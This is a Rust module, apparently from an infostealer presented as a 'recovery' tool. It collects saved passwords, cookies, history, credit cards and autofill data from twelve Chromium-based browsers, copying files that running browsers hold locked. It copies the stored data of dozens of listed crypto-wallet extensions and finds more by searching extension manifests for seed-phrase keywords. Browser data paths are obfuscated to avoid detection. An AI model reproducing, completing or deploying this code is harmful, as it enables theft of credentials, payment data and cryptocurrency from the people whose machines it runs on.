use crate::recovery::context::RecoveryContext;
use crate::recovery::fs::copy_dir_limited;
use crate::recovery::helpers::obfuscation::deobf;
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use async_trait::async_trait;
use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;
use tracing::{debug, warn};
use winreg::RegKey;
use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};

#[derive(Clone, Copy, Debug)]
pub enum BrowserDataKind {
    Passwords,
    Bookmarks,
    History,
    Cookies,
    CreditCards,
    Autofill,
}

impl BrowserDataKind {
    pub const fn all() -> [Self; 6] {
        [
            Self::Passwords,
            Self::Bookmarks,
            Self::History,
            Self::Cookies,
            Self::CreditCards,
            Self::Autofill,
        ]
    }

    pub const fn label(&self) -> &'static str {
        match self {
            Self::Passwords => "Passwords",
            Self::Bookmarks => "Bookmarks",
            Self::History => "History",
            Self::Cookies => "Cookies",
            Self::CreditCards => "Credit Cards",
            Self::Autofill => "Autofill",
        }
    }

    pub const fn file_names(&self) -> &'static [&'static str] {
        match self {
            Self::Passwords => &["Login Data"],
            Self::Bookmarks => &["Bookmarks"],
            Self::History => &["History"],
            Self::Cookies => &["Cookies"],
            Self::CreditCards => &["Web Data", "Web Data-journal"],
            Self::Autofill => &["Web Data", "Web Data-journal"],
        }
    }
}

#[derive(Clone, Copy, Debug)]
pub enum BrowserName {
    Chrome,
    Edge,
    Brave,
    Opera,
    Chromium,
    Vivaldi,
    Yandex,
    ThreeSixty, // 360
    QQ,
    CocCoc,
    NaverWhale,
    Arc,
}

impl BrowserName {
    pub fn label(&self) -> &'static str {
        match self {
            BrowserName::Chrome => "Google Chrome",
            BrowserName::Edge => "Microsoft Edge",
            BrowserName::Brave => "Brave Browser",
            BrowserName::Opera => "Opera Browser",
            BrowserName::Chromium => "Chromium",
            BrowserName::Vivaldi => "Vivaldi",
            BrowserName::Yandex => "Yandex",
            BrowserName::ThreeSixty => "360 Browser",
            BrowserName::QQ => "QQ Browser",
            BrowserName::CocCoc => "CocCoc",
            BrowserName::NaverWhale => "Naver Whale",
            BrowserName::Arc => "Arc",
        }
    }

    pub fn process_name(&self) -> &'static str {
        match self {
            BrowserName::Chrome => "chrome.exe",
            BrowserName::Edge => "msedge.exe",
            BrowserName::Brave => "brave.exe",
            BrowserName::Opera => "opera.exe",
            BrowserName::Chromium => "chromium.exe",
            BrowserName::Vivaldi => "vivaldi.exe",
            BrowserName::Yandex => "browser.exe",
            BrowserName::ThreeSixty => "360chrome.exe",
            BrowserName::QQ => "QQBrowser.exe",
            BrowserName::CocCoc => "browser.exe",
            BrowserName::NaverWhale => "whale.exe",
            BrowserName::Arc => "Arc.exe",
        }
    }
}

#[derive(Clone, Debug)]
pub struct BrowserProfile {
    pub browser: BrowserName,
    pub profile_name: String,
    pub path: PathBuf,
}

impl BrowserProfile {
    pub async fn discover_for_root(browser: BrowserName, root: &Path) -> Vec<Self> {
        let mut profiles = Vec::new();

        let mut dir = match fs::read_dir(root).await {
            Ok(dir) => dir,
            Err(err) => {
                debug!(browser=?browser, path=?root, error=?err, "browser root missing");
                return profiles;
            }
        };

        while let Ok(Some(entry)) = dir.next_entry().await {
            if let Ok(metadata) = entry.metadata().await {
                if metadata.is_dir() {
                    let profile_name = entry.file_name().to_string_lossy().into_owned();
                    profiles.push(Self {
                        browser,
                        profile_name,
                        path: entry.path(),
                    });
                }
            }
        }

        let default_profile = root.join("Default");
        if profiles
            .iter()
            .all(|profile| profile.profile_name != "Default")
        {
            if let Ok(metadata) = fs::metadata(&default_profile).await {
                if metadata.is_dir() {
                    profiles.push(Self {
                        browser,
                        profile_name: "Default".into(),
                        path: default_profile,
                    });
                }
            }
        }

        profiles
    }
}

pub struct BrowserRecoveryTask {
    profile: BrowserProfile,
    kind: BrowserDataKind,
}

impl BrowserRecoveryTask {
    pub fn new(profile: BrowserProfile, kind: BrowserDataKind) -> Self {
        Self { profile, kind }
    }
}

#[async_trait]
impl RecoveryTask for BrowserRecoveryTask {
    fn label(&self) -> String {
        format!(
            "{browser}/{profile} - {kind}",
            browser = self.profile.browser.label(),
            profile = self.profile.profile_name,
            kind = self.kind.label()
        )
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Browsers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();

        for file_name in self.kind.file_names().iter() {
            let candidate = self.profile.path.join(file_name);
            match fs::metadata(&candidate).await {
                Ok(metadata) if metadata.is_file() => {
                    let mut final_path = candidate.clone();

                    if matches!(
                        self.kind,
                        BrowserDataKind::Cookies
                            | BrowserDataKind::History
                            | BrowserDataKind::Passwords
                    ) {
                        let temp_dir = ctx
                            .output_dir
                            .join("browsers")
                            .join(self.profile.browser.label());
                        let _ = std::fs::create_dir_all(&temp_dir);
                        let dest = temp_dir.join(format!(
                            "{}_{}_{}",
                            self.profile.profile_name,
                            self.kind.label(),
                            file_name
                        ));

                        if super::lockedfile::copy_locked_file(
                            self.profile.browser.process_name(),
                            &candidate,
                            &dest,
                        ) {
                            final_path = dest;
                        }
                    }

                    if let Ok(new_metadata) = fs::metadata(&final_path).await {
                        artifacts.push(RecoveryArtifact {
                            label: self.kind.label().to_string(),
                            path: final_path,
                            size_bytes: new_metadata.len(),
                            modified: new_metadata.modified().ok(),
                        });
                    }
                }
                Ok(_) => {
                    warn!(path=?candidate, "expected file but found directory");
                }
                Err(err) => {
                    debug!(path=?candidate, error=?err, "missing browser artifact");
                }
            }
        }

        Ok(artifacts)
    }
}

pub struct BrowserExtensionTask {
    profile: BrowserProfile,
}

const TARGET_EXTENSIONS: &[(&str, &str)] = &[
    ("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
    ("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
    ("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
    ("Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
    ("Ronin Wallet", "fnjhmkhhmkbjkkabndcnnogagogbneec"),
    ("Binance Chain Wallet", "fhbohimaelbohpjbbldcngcnapndodjp"),
    ("Yoroi", "ffnbelfdoeioaeonhjbnjfmkonbpphgo"),
    ("Sollet", "fhmfbegecebeonpjjmbbpccclghjbhcl"),
    ("OKX Wallet", "mclkkofklkfljcocclepkeepbbeeeocl"),
    ("Authenticator", "bhghoamapcdpobmchallangeid"),
    ("Math Wallet", "afbcbbaebocleolnjfgobidebfbbidnf"),
    ("Exodus Web3", "aholpfdialccbhicgbbehbafndfillid"),
    ("Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph"),
    ("BitKeep", "jiidiaalihomgebjjocbdghipdbncbda"),
    ("Solflare", "bhhhlbcehkeepbhfofnnjkbeueononhe"),
    ("Rabby Wallet", "acmacmhlonlcgoaoihhmhfbbemndbagc"),
    ("Kaikas", "jblndmgejeenekfeiljndjkbbunba"),
    ("Terra Station", "aiifnbfmplejblepbghpkeccgpobhlpk"),
    ("Keplr", "dmkamcknogkgcdfhhbddcghachpanceb"),
    ("GeroWallet", "bgpipimicnnhedneaaggifneimhlakdq"),
    ("Martian Wallet", "efbglgofoippbgadhlgakkebhffoibda"),
    ("Petra Wallet", "fijngjgcjhjmkafhbhglglpmgdgeclbh"),
    ("Pontem Wallet", "phkbamefinggnoigpghpacnppfbcocll"),
    ("Fewcha Wallet", "ebfidppbeapgggoabnmphhconihbaloo"),
    ("Ethos Wallet", "mcbigmjiafegjgebiogimnoicpddidoh"),
    ("Sui Wallet", "opcgpfmccihajmfhljleebpepfdboncl"),
    ("Nami", "lpchoebaghpjnleebgfbediaeaebdebe"),
    ("Maiar DeFi Wallet", "dkhoceliihnoosnmankmglehlachmcoc"),
    ("Authenticator 2", "ocglpnciphfbiokegecmnoaocnhfdmmp"),
    ("Guarda", "hpglfhgfnhbgpjpfpgjicgln"),
    ("Jaxx Liberty", "cjelfplplepabbackneaniopclgppcll"),
    ("Wombat", "amjlehdcaognenonmdeunonlgdbmmobe"),
    ("MEW CX", "nlbmnnijcnlegmoebonhpfbhbopfdcom"),
    ("Saturn Wallet", "nkddgncdjgjfcddabkaicgepbbndgcon"),
    ("ZilPay", "klnaejjgbibmccnnocpknocnmedeecce"),
    ("Ever Wallet", "npkejubjmaphclfkjcladhpkogmhcobk"),
    ("Braavos", "ohenlellnohplepnedmjalpakoebmjid"),
    ("Argent X", "dlcobpjiigpikoechnabeenhconllbop"),
    ("Slope Wallet", "pocmplpaccclhnjgdigolocialocnnhl"),
    ("Kardiachain", "pdadjkfkgcafgbceimclbndnlnnbiidk"),
    ("Leap Terra", "ndijmbeodpejfibkhbaemojingniedcl"),
    ("SubWallet", "onhogfjephnmsgpfphnngncjgepkckhf"),
    ("Polkadot{.js}", "mopnnhnimadngocjndndjeobkocflbcl"),
    ("Talisman", "fijngjgcjhjmkafhbhglglpmgdgeclbh"),
    ("Enkrypt", "pncajimpkhpcedicglagiedpemhgbedf"),
    ("SafePal", "lgmpdoooghpkibfooqebeunackpkamca"),
    ("Xverse", "idnnbpkonabnnocdbimnboakidmojgiu"),
    ("Leather", "ldojebmookaiafnpeclbiiknphhbhnjd"),
    ("UniSat", "ppbibelpcjmhbdihakhencnbalnplehc"),
    ("OneKey", "jojhbbmbiameaonhbeidepcongalmeta"),
    ("Core", "agoakfeocalloabgjbebhocmclnnoocg"),
    ("Bitski", "mooonnbaicgjjobndhkgebeobhkeimbi"),
    ("Venom", "nanjmgljbomhgeclgabbbiuabj"),
    ("Rise Wallet", "jojhbbmbiameaonhbeidepcongalmeta"),
];

#[async_trait]
impl RecoveryTask for BrowserExtensionTask {
    fn label(&self) -> String {
        format!(
            "{browser}/{profile} - Extensions",
            browser = self.profile.browser.label(),
            profile = self.profile.profile_name
        )
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let local_ext_settings = self.profile.path.join("Local Extension Settings");
        let indexed_db = self.profile.path.join("IndexedDB");
        let local_storage = self.profile.path.join("Local Storage").join("leveldb");

        // 1. Identify Target Extensions (Whitelist + Heuristic)
        let mut target_ids = Vec::new();
        for (name, id) in TARGET_EXTENSIONS {
            target_ids.push((name.to_string(), id.to_string()));
        }

        // Heuristic Discovery: Scan all extensions for crypto keywords in manifest
        let extensions_root = self.profile.path.join("Extensions");
        if let Ok(mut dir) = fs::read_dir(&extensions_root).await {
            while let Ok(Some(entry)) = dir.next_entry().await {
                let id = entry.file_name().to_string_lossy().to_string();
                if target_ids.iter().any(|(_, tid)| tid == &id) {
                    continue;
                }

                if let Some(name) = self.heuristic_check_extension(&entry.path()).await {
                    target_ids.push((format!("Heuristic_{}", name), id));
                }
            }
        }

        // 2. Capture Data for all identified IDs
        for (name, id) in target_ids {
            let extension_settings_dir = local_ext_settings.join(&id);
            if fs::metadata(&extension_settings_dir).await.is_ok() {
                let dest_root = ctx
                    .output_dir
                    .join("services")
                    .join("Wallets")
                    .join(format!(
                        "{}_{}_{}_Settings",
                        self.profile.browser.label(),
                        self.profile.profile_name,
                        name
                    ));
                let _ = fs::create_dir_all(&dest_root).await;
                let _ = copy_dir_limited(
                    &extension_settings_dir,
                    &dest_root,
                    &name,
                    &mut artifacts,
                    usize::MAX,
                    0,
                )
                .await;
            }

            if fs::metadata(&indexed_db).await.is_ok() {
                if let Ok(mut dir) = fs::read_dir(&indexed_db).await {
                    while let Ok(Some(entry)) = dir.next_entry().await {
                        let fname = entry.file_name().to_string_lossy().to_string();
                        if fname.contains(&id) {
                            let dest_root =
                                ctx.output_dir
                                    .join("services")
                                    .join("Wallets")
                                    .join(format!(
                                        "{}_{}_{}_IndexedDB",
                                        self.profile.browser.label(),
                                        self.profile.profile_name,
                                        name
                                    ));
                            let _ = fs::create_dir_all(&dest_root).await;
                            let _ = copy_dir_limited(
                                &entry.path(),
                                &dest_root.join(&fname),
                                &name,
                                &mut artifacts,
                                usize::MAX,
                                0,
                            )
                            .await;
                        }
                    }
                }
            }

            if fs::metadata(&local_storage).await.is_ok() {
                let dest_root = ctx
                    .output_dir
                    .join("services")
                    .join("Wallets")
                    .join(format!(
                        "{}_{}_{}_Storage",
                        self.profile.browser.label(),
                        self.profile.profile_name,
                        name
                    ));

                if let Ok(mut dir) = fs::read_dir(&local_storage).await {
                    while let Ok(Some(entry)) = dir.next_entry().await {
                        let fname = entry.file_name().to_string_lossy().to_string();
                        if fname.contains(&id) {
                            let _ = fs::create_dir_all(&dest_root).await;
                            let target = dest_root.join(&fname);
                            if let Ok(_) = fs::copy(entry.path(), &target).await {
                                let meta = fs::metadata(&target).await?;
                                artifacts.push(RecoveryArtifact {
                                    label: format!("{} Storage", name),
                                    path: target,
                                    size_bytes: meta.len(),
                                    modified: meta.modified().ok(),
                                });
                            }
                        }
                    }
                }
            }
        }

        Ok(artifacts)
    }
}

impl BrowserExtensionTask {
    pub fn new(profile: BrowserProfile) -> Self {
        Self { profile }
    }

    async fn heuristic_check_extension(&self, path: &Path) -> Option<String> {
        // Extensions are usually Extensions/{id}/{version}/manifest.json
        if let Ok(mut dir) = fs::read_dir(path).await {
            while let Ok(Some(version_entry)) = dir.next_entry().await {
                let manifest_path = version_entry.path().join("manifest.json");
                if let Ok(content) = fs::read_to_string(&manifest_path).await {
                    let content_low = content.to_lowercase();
                    let keywords = [
                        "wallet", "crypto", "mnemonic", "bip39", "bitcoin", "ethereum", 
                        "solana", "passphrase", "seed phrase", "ledger", "trezor"
                    ];
                    
                    if keywords.iter().any(|&k| content_low.contains(k)) {
                        // Extract name from manifest
                        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                            if let Some(name) = json.get("name").and_then(|v| v.as_str()) {
                                 return Some(name.to_string());
                            }
                        }
                        return Some("UnknownCryptoExtension".to_string());
                    }
                }
            }
        }
        None
    }
}

pub async fn default_browser_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    let mut tasks: Vec<Arc<dyn RecoveryTask>> = Vec::new();
    let mut seen_roots = HashSet::new();

    // 1. Process-Based Discovery (Active Browsers)
    let running_roots = find_running_browsers(ctx);
    for (browser, root) in running_roots {
        if seen_roots.insert(root.to_string_lossy().to_string().to_lowercase()) {
            let profiles = BrowserProfile::discover_for_root(browser, &root).await;
            for profile in profiles {
                for kind in BrowserDataKind::all() {
                    tasks.push(Arc::new(BrowserRecoveryTask::new(profile.clone(), kind)));
                }
                tasks.push(Arc::new(BrowserExtensionTask::new(profile.clone())));
            }
        }
    }

    // 2. Registry Discovery (Dynamic)
    let registry_roots = find_registry_browsers(ctx);
    for (browser, root) in registry_roots {
        if seen_roots.insert(root.to_string_lossy().to_string().to_lowercase()) {
            let profiles = BrowserProfile::discover_for_root(browser, &root).await;
            for profile in profiles {
                for kind in BrowserDataKind::all() {
                    tasks.push(Arc::new(BrowserRecoveryTask::new(profile.clone(), kind)));
                }
                tasks.push(Arc::new(BrowserExtensionTask::new(profile.clone())));
            }
        }
    }

    // 3. Standard Path Discovery (Fallback/Manual)
    for (browser, root) in browser_data_roots(ctx) {
        if seen_roots.insert(root.to_string_lossy().to_string().to_lowercase()) {
            let profiles = BrowserProfile::discover_for_root(browser, &root).await;
            for profile in profiles {
                for kind in BrowserDataKind::all() {
                    tasks.push(Arc::new(BrowserRecoveryTask::new(profile.clone(), kind)));
                }
                tasks.push(Arc::new(BrowserExtensionTask::new(profile.clone())));
            }
        }
    }

    tasks
}

fn find_running_browsers(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
    let mut results = Vec::new();
    
    // We iterate through our known browsers and check if their processes are active
    let browsers = [
        BrowserName::Chrome, BrowserName::Edge, BrowserName::Brave, BrowserName::Opera,
        BrowserName::Vivaldi, BrowserName::Yandex, BrowserName::ThreeSixty, BrowserName::QQ,
        BrowserName::CocCoc, BrowserName::NaverWhale, BrowserName::Arc, BrowserName::Chromium
    ];

    for browser in browsers {
        let pid = super::lockedfile::proc::find_by_name(browser.process_name());
        if pid != 0 {
            // If we found a PID, try to get its executable path
            use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION};
            use windows::Win32::System::ProcessStatus::K32GetModuleFileNameExW;
            use windows::Win32::Foundation::CloseHandle;

            unsafe {
                if let Ok(h_proc) = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid) {
                    let mut path_buf = [0u16; 1024];
                    let len = K32GetModuleFileNameExW(h_proc, None, &mut path_buf);
                    let _ = CloseHandle(h_proc);

                    if len > 0 {
                        let exe_path = PathBuf::from(String::from_utf16_lossy(&path_buf[..len as usize]));
                        if let Some(data_root) = resolve_data_root(ctx, browser, &exe_path) {
                            if data_root.exists() {
                                results.push((browser, data_root));
                            }
                        }
                    }
                }
            }
        }
    }
    
    results
}

fn find_registry_browsers(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
    let mut results = Vec::new();
    let reg_path = "SOFTWARE\\Clients\\StartMenuInternet";

    for root in [HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER] {
        if let Ok(key) = RegKey::predef(root).open_subkey(reg_path) {
            for name in key.enum_keys().filter_map(Result::ok) {
                if let Ok(browser_key) = key.open_subkey(&name) {
                    if let Ok(command_key) = browser_key.open_subkey("shell\\open\\command") {
                        if let Ok(exe_path_raw) = command_key.get_value::<String, _>("") {
                            // Clean "path/to/exe" --args
                            let exe_path = exe_path_raw.trim_matches('"').split(".exe").next().map(|s| format!("{}.exe", s)).unwrap_or(exe_path_raw);
                            let exe_path = PathBuf::from(exe_path);
                            
                            if let Some(browser_name) = match_browser_by_path(&exe_path) {
                                if let Some(data_root) = resolve_data_root(ctx, browser_name, &exe_path) {
                                    if data_root.exists() {
                                        results.push((browser_name, data_root));
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    results
}

fn match_browser_by_path(path: &Path) -> Option<BrowserName> {
    let path_str = path.to_string_lossy().to_lowercase();
    if path_str.contains("chrome.exe") { Some(BrowserName::Chrome) }
    else if path_str.contains("msedge.exe") { Some(BrowserName::Edge) }
    else if path_str.contains("brave.exe") { Some(BrowserName::Brave) }
    else if path_str.contains("opera.exe") || path_str.contains("opera gx") { Some(BrowserName::Opera) }
    else if path_str.contains("vivaldi.exe") { Some(BrowserName::Vivaldi) }
    else if path_str.contains("browser.exe") && path_str.contains("yandex") { Some(BrowserName::Yandex) }
    else if path_str.contains("360chrome.exe") { Some(BrowserName::ThreeSixty) }
    else if path_str.contains("qqbrowser.exe") { Some(BrowserName::QQ) }
    else if path_str.contains("browser.exe") && path_str.contains("coccoc") { Some(BrowserName::CocCoc) }
    else if path_str.contains("whale.exe") { Some(BrowserName::NaverWhale) }
    else if path_str.contains("arc.exe") { Some(BrowserName::Arc) }
    else if path_str.contains("chromium.exe") { Some(BrowserName::Chromium) }
    else { None }
}

fn resolve_data_root(ctx: &RecoveryContext, browser: BrowserName, _exe_path: &Path) -> Option<PathBuf> {
    // For installed browsers, data is almost always in AppData regardless of install drive
    // We reuse the standard roots but this allows us to confirm they exist if registry says browser is there.
    let roots = browser_data_roots(ctx);
    roots.into_iter().find(|(b, _)| *b as usize == browser as usize).map(|(_, p)| p)
}

pub fn browser_data_roots(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
    vec![
        (
            BrowserName::Chrome,
            // "Google/Chrome/User Data"
            ctx.local_data_dir.join(deobf(&[
                0xFA, 0xCE, 0xCE, 0xDA, 0xDB, 0xD8, 0xAF, 0xFC, 0xCD, 0xCF, 0xD2, 0xDB, 0xD8, 0xAF,
                0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
            ])),
        ),
        (
            BrowserName::Edge,
            // "Microsoft/Edge/User Data"
            ctx.local_data_dir.join(deobf(&[
                0xF0, 0xD4, 0xDE, 0xCF, 0xD2, 0xCE, 0xD2, 0xDB, 0xC9, 0xAF, 0xFC, 0xDB, 0xDA, 0xD8,
                0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
            ])),
        ),
        (
            BrowserName::Brave,
            // "BraveSoftware/Brave-Browser/User Data"
            ctx.local_data_dir.join(deobf(&[
                0x9F, 0xCF, 0xDA, 0xC3, 0xD8, 0xA6, 0xD2, 0xDB, 0xDB, 0x8A, 0xDA, 0xCF, 0xCE, 0xAF,
                0x9F, 0xCF, 0xDA, 0xC3, 0xD8, 0x90, 0x9F, 0xCF, 0xD2, 0xDA, 0x8E, 0xD8, 0xCF, 0xAF,
                0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
            ])),
        ),
        (
            BrowserName::Opera,
            // "Opera Software/Opera Stable"
            ctx.roaming_data_dir.join(deobf(&[
                0xFC, 0x8D, 0xD8, 0xCF, 0xDA, 0xE1, 0xA6, 0xD2, 0xDB, 0xDB, 0x8A, 0xDA, 0xCF, 0xCE,
                0xAF, 0xFC, 0x8D, 0xD8, 0xCF, 0xDA, 0xE1, 0xA6, 0xDB, 0xDA, 0x9F, 0xDB, 0xD8,
            ])),
        ),
        (
            BrowserName::Chromium,
            // "Chromium/User Data"
            ctx.local_data_dir.join(deobf(&[
                0xFC, 0xCD, 0xCF, 0xD2, 0xDB, 0xD4, 0xC8, 0xDB, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1,
                0xF1, 0xDA, 0xDB, 0xDA,
            ])),
        ),
        (
            BrowserName::Vivaldi,
            // "Vivaldi/User Data"
            ctx.local_data_dir.join(deobf(&[
                0xA1, 0xD4, 0xCC, 0xD4, 0xDB, 0xD3, 0xD2, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1,
                0xDA, 0xDB, 0xDA,
            ])),
        ),
        (
            BrowserName::Yandex,
            // "Yandex/YandexBrowser/User Data"
            ctx.local_data_dir.join(deobf(&[
                0xA2, 0xD4, 0xCF, 0xD3, 0xCE, 0xDF, 0xAF, 0xA2, 0xD4, 0xCF, 0xD3, 0xCE, 0xDF, 0x9F,
                0xCF, 0xD2, 0xDA, 0x8E, 0xD8, 0xCF, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA,
                0xDB, 0xDA,
            ])),
        ),
        (
            BrowserName::ThreeSixty,
            // "360Browser/Browser/User Data"
            ctx.local_data_dir.join(deobf(&[
                0x86, 0x83, 0x85, 0x9F, 0xCF, 0xD2, 0xDA, 0x8E, 0xD8, 0xCF, 0xAF, 0x9F, 0xCF, 0xD2,
                0xDA, 0x8E, 0xD8, 0xCF, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
            ])),
        ),
        (
            BrowserName::QQ,
            // "Tencent/QQBrowser/User Data"
            ctx.local_data_dir.join(deobf(&[
                0x9F, 0xCE, 0xCF, 0x94, 0xCE, 0xCF, 0xDB, 0xAF, 0x84, 0x84, 0x9F, 0xCF, 0xD2, 0xDA,
                0x8E, 0xD8, 0xCF, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
            ])),
        ),
        (
            BrowserName::CocCoc,
            // "CocCoc/Browser/User Data"
            ctx.local_data_dir.join(deobf(&[
                0x90, 0xDA, 0x90, 0x90, 0xDA, 0x90, 0xAF, 0x9F, 0xCF, 0xD2, 0xDA, 0x8E, 0xD8, 0xCF,
                0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
            ])),
        ),
        (
            BrowserName::NaverWhale,
            // "Naver/Whale/User Data"
            ctx.local_data_dir.join(deobf(&[
                0xF3, 0xD4, 0xCC, 0xCE, 0xDB, 0xAF, 0x94, 0xDB, 0xD4, 0xDB, 0xCE, 0xAF, 0xA0, 0x8E,
                0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
            ])),
        ),
        (
            BrowserName::Arc,
            // "Arc/User Data"
            ctx.local_data_dir.join(deobf(&[
                0xFA, 0xDB, 0x90, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
            ])),
        ),
    ]
}
